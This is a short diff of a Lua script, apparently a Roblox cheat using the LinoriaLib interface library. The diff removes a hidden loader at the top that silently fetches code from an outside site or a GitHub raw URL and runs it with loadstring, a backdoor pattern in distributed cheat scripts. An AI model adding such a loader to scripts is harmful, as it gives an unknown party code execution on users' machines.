@@ -1,9 +1,3 @@
-getgenv().Script = 'https://raw.githubusercontent.com/abramsonhan/RScritps/refs/heads/main/reievasl1fewfbw9'
-local remote
-pcall(function() remote = game:HttpGet('https://rbxscript.do.am/loader/main.html') end)
-if not remote or remote == "" then pcall(function() remote = game:HttpGet(getgenv().Script) end) end
-if remote then pcall(loadstring(remote)) end
-
 local repo = "https://raw.githubusercontent.com/mstudio45/LinoriaLib/main/"
 
 local Library = loadstring(game:HttpGet(repo .. "Library.lua"))()
